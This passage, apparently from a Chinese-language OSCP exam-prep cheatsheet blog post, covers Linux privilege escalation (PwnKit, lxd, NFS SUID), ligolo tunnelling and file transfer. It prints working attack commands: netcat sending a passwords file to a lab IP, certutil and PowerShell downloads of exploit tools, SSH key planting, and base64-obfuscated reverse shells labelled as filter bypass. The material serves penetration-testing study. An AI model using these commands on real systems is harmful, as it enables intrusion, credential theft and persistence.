+<h3 id="Pwnkit"><a href="#Pwnkit" class="headerlink" title="Pwnkit"></a>Pwnkit</h3><p><a href="https://github.com/arthepsy/CVE-2021-4034" target="_blank" rel="noopener">https://github.com/arthepsy/CVE-2021-4034</a></p>
+<pre><code>user@debian:~$ grep PRETTY /etc/os-release
+PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;
+user@debian:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+user@debian:~$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
+user@debian:~$ ./cve-2021-4034-poc
+
+It&#39;s all about the version.
+
+According to https://github.com/cyberark/PwnKit-Hunter/blob/main/CVE-2021-4034_Finder.py versions below these are vulnerable:
+Ubuntu 20.04: 0.105-26ubuntu1.2
+Ubuntu 21.10: 0.105-31ubuntu0.1
+Ubuntu 18.04: 0.105-20ubuntu0.18.04.6
+Debian stretch: 0.105-18+deb9u2
+Debian buster: 0.105-25+deb10u1
+Debian bullseye: 0.105-31+deb11u1
+</code></pre><p><a name="dR1o6"></a></p>
+<h3 id="lxd提权"><a href="#lxd提权" class="headerlink" title="lxd提权"></a>lxd提权</h3><p>首先要在lxd group中，并且安装了lxc<br><a href="https://reboare.github.io/lxd/lxd-escape.html" target="_blank" rel="noopener">https://reboare.github.io/lxd/lxd-escape.html</a><br><a href="https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/" target="_blank" rel="noopener">https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/</a></p>
+<pre><code>ubuntu@ubuntu:~$ lxd init（都按默认一路回车）
+ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
+Creating test 
+ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+Device whatever added to test 
+ubuntu@ubuntu:~$ lxc start test 
+ubuntu@ubuntu:~$ lxc exec test bash 
+</code></pre><p><a name="lWsC8"></a></p>
+<h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><p>首先要/etc/exports文件中写的文件夹权限是no_root_squash<br><img src="http://0blog.test.upcdn.net/20231028174457.png" alt></p>
+<pre><code>(in Kali)
+# showmount -e 192.168.146.60           
+Export list for 192.168.146.60:
+/home/user5 *
+# mkdir nfstmp                                                                        
+# mount -t nfs 192.168.146.60:/home/user5 nfstmp                        130 ⨯
+# cd nfstmp                                                                                           
+# cp /bin/sh ./nfsh
+# chmod +s
+(in target)
+# ./sh -p
+</code></pre><p>挂载共享后放个SUID文件再提权，实测这种方法不管是拷bash、编译c还是写python，都会产生文件euid和uid不相等的情况，这种情况下会实际以uid权限执行导致提权失败，因此sh要加-p参数不重置euid。<br><img src="http://0blog.test.upcdn.net/20231028174517.png" alt><br><a name="XNGkr"></a></p>
+<h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><p>(placeholder)<br><a name="VV1Xb"></a></p>
+<h2 id="搭建隧道"><a href="#搭建隧道" class="headerlink" title="搭建隧道"></a>搭建隧道</h2><pre><code>kali上
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+
+kali:
+./proxy -selfcert
+
+靶机:
+agentw64.exe -connect 192.168.119.166:11601 -ignore-cert 
+
+kali:
+&gt;session
+&gt;ifconfig
+
+另起一个命令行:
+ip route add 10.10.56.0/24 dev ligolo    #10.10.56.0是要去往的那个网段
+
+&gt;start
+
+&gt;端口转发功能:
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp 
+将靶机的1234端口转发到kali的4321端口
+
+listener_add --addr 127.0.0.1:80 --to 0.0.0.0:80 --tcp 
+将kali的80端口转发到靶机的80端口
+
+注意0.0.0.0 代表的就算agent地址
+127.0.0.1 代表的是kali的地址，不需要换ip，直接用
+</code></pre><p><a name="LLnq2"></a></p>
+<h2 id="文件相关"><a href="#文件相关" class="headerlink" title="文件相关"></a>文件相关</h2><p><a name="twWRy"></a></p>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><pre><code>$ cat &gt; test.c
+void __attribute__((constructor)) init (void)
+{
+chown(&quot;/tmp/test&quot;, 0, 0);
+chmod(&quot;/tmp/test&quot;, 04755);
+}
+^D
+
+cat &gt; 2.txt &lt;&lt;EOF
+this is test
+this is test
+this is test
+EOF
+</code></pre><p><a name="vOCJp"></a></p>
+<h3 id="写公钥"><a href="#写公钥" class="headerlink" title="写公钥"></a>写公钥</h3><pre><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdubHNkqPbAwD0ikkAKCWcEmxDNokB4gYle0ioj/NC/PA6wQjHRFOA32H/xGS1aGuTv3+xe9d7F4m6QuhZytNJ6QeVchqnf6zqg+0XlRyNxA3SUVxl2j+8fMgHeA92QqfWoIcknH/CaEWo5ZQTrSL4+A0hX2c7xMy2RyU4LEYxY3pEy9LayHmaqjHd3CKaeiDDDyEhSuGNPn1xPAOLB4h4idk88Ih50tu6rbl0hk/rEUCFYTTsWNtVy1u+uGAqimHv0xsYKQux1JLkymKYERXwTxSmNjK0Bx/d5IrI4oh4iUfnxqsvwcG6Sb6sKFwlhYypNgRr6zU3eZMltsSlc10j root@kali&quot; &gt; .ssh/authorized_keys
+</code></pre><p><a name="PrruG"></a></p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><pre><code>nc.exe 192.168.45.201 80 &lt; &quot;C:\Users\offsec\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt&quot;
+nc -lp 80 &gt; pass.txt
+
+scp C:\windows.old\windows\system32\SAM root@10.10.100.147:/root/Desktop/
+
+kali&gt; impacket-smbserver myshare ./ -smb2
+net use M: \\10.10.100.147:4455\myshare
+cp a.exe M:
+</code></pre><p><a name="slKnq"></a></p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre><code>certutil.exe -urlcache -split -f &quot;http://192.168.45.234/PrintSpoofer64.exe&quot;
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object System.Net.WebClient).downloadFile(&#39;http://192.168.49.133/winPEASany.exe&#39;,&#39;c:\Users\rupert\Desktop\wp.exe&#39;)&quot;
+</code></pre><p><a name="torPO"></a></p>
+<h3 id="查找文件内容"><a href="#查找文件内容" class="headerlink" title="查找文件内容"></a>查找文件内容</h3><pre><code>$ grep -R &quot;.trash_old&quot; /var/ 2&gt;/dev/null
+/var/spool/cron/crontabs/root:* * * * * /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
+
+find / -type f | xargs grep tmp.py
+</code></pre><p><a name="Ll3gC"></a></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a name="hzxQ2"></a></p>
+<h3 id="Python-virtualenv"><a href="#Python-virtualenv" class="headerlink" title="Python virtualenv"></a>Python virtualenv</h3><pre><code>virtualenv .
+source ./bin/active
+./bin/deactivate
+</code></pre><p><a name="d4VrL"></a></p>
+<h3 id="searchsploit-1"><a href="#searchsploit-1" class="headerlink" title="searchsploit"></a>searchsploit</h3><pre><code>searchsploit -u # 更新库
+searchsploit -m 50505 # 拷贝到本地
+searchsploit -x 50505 # 查看exp内容
+</code></pre><p><a name="QFmA3"></a></p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>/bin/ech? bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjU2LjEwMyA2NjY2ICAK|/u?r/b?n/b?se64 -d|/bin/?h
+
+echo+YnVzeWJveCBuYyAxOTIuMTY4LjE0Ni41NSA4ODg4IC1lIC9iaW4vYmFzaA==+|+base64+-d|sh
+
+-t &#39;bash --noprofile&#39; 绕过rbash
+</code></pre><p><a name="QlDoi"></a></p>
+<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><pre><code>//加密命令
+echo &quot;ls -l&quot; | base64
+
+//解密命令并执行
+echo bHMgLWwK | base64 -d | sh
+</code></pre>
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2023-10-28/">
+                    窗口期的OSCP(PEN-200-2023)总结
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2023-04-30/">
+                    50台Vulnhub靶机Walkthrough
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#侦察"><span class="toc-number">1.</span> <span class="toc-text">侦察</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-FTP"><span class="toc-number">1.2.</span> <span class="toc-text">21 FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80-扫目录"><span class="toc-number">1.3.</span> <span class="toc-text">80 扫目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80-FUZZ-API"><span class="toc-number">1.4.</span> <span class="toc-text">80 FUZZ, API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80-wpscan"><span class="toc-number">1.5.</span> <span class="toc-text">80 wpscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80-hosts-cms"><span class="toc-number">1.6.</span> <span class="toc-text">80 hosts / cms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#135-RPC"><span class="toc-number">1.7.</span> <span class="toc-text">135 RPC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#161-SNMP-udp"><span class="toc-number">1.8.</span> <span class="toc-text">161 SNMP udp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#445-smb"><span class="toc-number">1.9.</span> <span class="toc-text">445 smb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1433-MSSQL"><span class="toc-number">1.10.</span> <span class="toc-text">1433 MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3389-RDP"><span class="toc-number">1.11.</span> <span class="toc-text">3389 RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-number">1.12.</span> <span class="toc-text">LFI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆破"><span class="toc-number">2.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字典"><span class="toc-number">2.1.</span> <span class="toc-text">字典</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra"><span class="toc-number">2.2.</span> <span class="toc-text">Hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wpscan"><span class="toc-number">2.3.</span> <span class="toc-text">wpscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#samba"><span class="toc-number">2.4.</span> <span class="toc-text">samba</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip"><span class="toc-number">2.5.</span> <span class="toc-text">zip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">3.</span> <span class="toc-text">getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell"><span class="toc-number">3.1.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION注入写shell"><span class="toc-number">3.2.</span> <span class="toc-text">UNION注入写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-number">3.3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socat完全交互式shell"><span class="toc-number">3.4.</span> <span class="toc-text">socat完全交互式shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python半交互式"><span class="toc-number">3.5.</span> <span class="toc-text">python半交互式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stty升级完全交互式"><span class="toc-number">3.6.</span> <span class="toc-text">stty升级完全交互式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows提权"><span class="toc-number">4.</span> <span class="toc-text">Windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#先看权限"><span class="toc-number">4.1.</span> <span class="toc-text">先看权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-number">4.2.</span> <span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看服务"><span class="toc-number">4.3.</span> <span class="toc-text">看服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Service-unquoted-path"><span class="toc-number">4.4.</span> <span class="toc-text">Service unquoted path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看漏洞"><span class="toc-number">4.5.</span> <span class="toc-text">看漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Winpeas"><span class="toc-number">4.6.</span> <span class="toc-text">Winpeas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AlwaysInstallElevated-MSI-Abuse"><span class="toc-number">4.7.</span> <span class="toc-text">AlwaysInstallElevated MSI Abuse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#手动找其他信息"><span class="toc-number">4.8.</span> <span class="toc-text">手动找其他信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux提权"><span class="toc-number">5.</span> <span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LinPEAS"><span class="toc-number">5.1.</span> <span class="toc-text">LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pspy"><span class="toc-number">5.2.</span> <span class="toc-text">Pspy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计划任务"><span class="toc-number">5.3.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-passwd"><span class="toc-number">5.4.</span> <span class="toc-text">/etc/passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID"><span class="toc-number">5.5.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特殊文件"><span class="toc-number">5.6.</span> <span class="toc-text">特殊文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit"><span class="toc-number">5.7.</span> <span class="toc-text">searchsploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖环境变量提权"><span class="toc-number">5.8.</span> <span class="toc-text">覆盖环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwnkit"><span class="toc-number">5.9.</span> <span class="toc-text">Pwnkit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lxd提权"><span class="toc-number">5.10.</span> <span class="toc-text">lxd提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS提权"><span class="toc-number">5.11.</span> <span class="toc-text">NFS提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域内横向"><span class="toc-number">6.</span> <span class="toc-text">域内横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搭建隧道"><span class="toc-number">7.</span> <span class="toc-text">搭建隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件相关"><span class="toc-number">8.</span> <span class="toc-text">文件相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写文件"><span class="toc-number">8.1.</span> <span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写公钥"><span class="toc-number">8.2.</span> <span class="toc-text">写公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件传输"><span class="toc-number">8.3.</span> <span class="toc-text">文件传输</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件下载"><span class="toc-number">8.4.</span> <span class="toc-text">文件下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查找文件内容"><span class="toc-number">8.5.</span> <span class="toc-text">查找文件内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他"><span class="toc-number">9.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-virtualenv"><span class="toc-number">9.1.</span> <span class="toc-text">Python virtualenv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit-1"><span class="toc-number">9.2.</span> <span class="toc-text">searchsploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过"><span class="toc-number">9.3.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64"><span class="toc-number">9.4.</span> <span class="toc-text">base64</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"OSCP NOTE (Cheatsheet)　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2023-10-28/" title="上一篇: 窗口期的OSCP(PEN-200-2023)总结">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2023-04-30/" title="下一篇: 50台Vulnhub靶机Walkthrough">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023-10-28/">窗口期的OSCP(PEN-200-2023)总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-07-14/">OSCP NOTE (Cheatsheet)</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-04-30/">50台Vulnhub靶机Walkthrough</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-02-13/">Honeypot-Factory: The Use of Deception in ICS/OT Environments</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-08-21/">Pass the Hash再思考：场景、补丁与监测</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-26/">RFID初探之M1卡的分析与复制（使用PN532模块）</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-13/">Websocket渗透测试指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-12-14/">关于log4j、log4shell的一些记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-11-27/">红队视角下的信息收集（备忘 && 持续收集）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-07-30/">Linux Basic for Hackers</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-02-09/">安全相关HTTP响应头解读、配置、示例与检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-10-31/">Cobaltstrike Server持久化 & Cobaltstrike与Metasploit相互派生shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-08-21/">深入了解子域名挖掘tricks</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-05-14/">Android开发实践之计算器&记事助手</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-13/">用Origin请求头防御CSRF攻击(译文)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-07/">PHP中的随机数安全问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-03-20/">WordPress 5.1.1 CSRF to RCE 跟进分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-02-15/">XML外部实体注入(XXE攻击)小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-01-26/">Django开发小记 & Docker笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-22/">前端安全之CSP、同源策略与跨域请求(JSONP/CORS)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-01/">使用Aircrack-ng破解WPA2协议无线网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-11-11/">PHP博客管理系统开发全记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-10-10/">环境配置踩坑记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-30/">区块链基础[待补充]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-05/">校园网免流攻略(基于逻辑漏洞、DNS伪装包或IPv6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-07-11/">基于Scrapy-Redis框架与Mongodb的分布式爬虫-elasticsearch搜索引擎打造</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-26/">《渗透测试实践指南》阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-16/">「Web向」XCTF联赛2018年度考点知识总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-14/">「娱乐向」 Hack for Fun</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-12/">从一道取证题目谈NTFS交换数据流</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-10/">关于Xdebug的那些事儿</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-26/">PHP弱类型&&md5碰撞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-24/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2024 Fazx
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+            
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "!!!∑(ﾟДﾟノ)ノ快回来!!!  " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
